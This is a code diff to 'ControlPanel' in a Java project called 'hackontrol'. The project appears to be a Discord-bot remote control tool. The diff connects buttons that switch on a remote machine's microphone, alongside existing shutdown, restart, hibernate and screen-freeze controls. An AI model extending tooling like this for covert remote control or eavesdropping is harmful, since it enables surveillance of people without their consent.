@@ -6,6 +6,7 @@ import com.khopan.hackontrol.manager.interaction.Question;
 import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
 import com.khopan.hackontrol.nativelibrary.Kernel;
 import com.khopan.hackontrol.registry.Registration;
+import com.khopan.hackontrol.utils.Microphone;
 import com.khopan.hackontrol.widget.ControlWidget;
 
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
@@ -24,6 +25,12 @@ public class ControlPanel extends Panel {
 	private static final Button BUTTON_SCREEN_FREEZE         = ButtonManager.staticButton(ButtonType.SUCCESS,   "Freeze",     "screenFreeze");
 	private static final Button BUTTON_SCREEN_UNFREEZE       = ButtonManager.staticButton(ButtonType.DANGER,    "Unfreeze",   "screenUnfreeze");
 
+	private final Microphone microphone;
+
+	public ControlPanel() {
+		this.microphone = new Microphone();
+	}
+
 	@Override
 	public String panelName() {
 		return ControlPanel.PANEL_NAME;
@@ -35,8 +42,8 @@ public class ControlPanel extends Panel {
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_HIBERNATE,             context -> Question.positive(context.reply(), "Are you sure you want to hibernate?", QuestionType.YES_NO, Kernel :: hibernate));
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_RESTART,               context -> Question.positive(context.reply(), "Are you sure you want to restart?",   QuestionType.YES_NO, Kernel :: restart));
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_SHUTDOWN,              context -> Question.positive(context.reply(), "Are you sure you want to shutdown?",  QuestionType.YES_NO, Kernel :: shutdown));
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_MICROPHONE_CONNECT,    context -> {});
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_MICROPHONE_DISCONNECT, context -> {});
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_MICROPHONE_CONNECT,    this.microphone :: connect);
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_MICROPHONE_DISCONNECT, this.microphone :: disconnect);
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_SCREEN_FREEZE,         context -> {});
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_SCREEN_UNFREEZE,       context -> {});
 	}
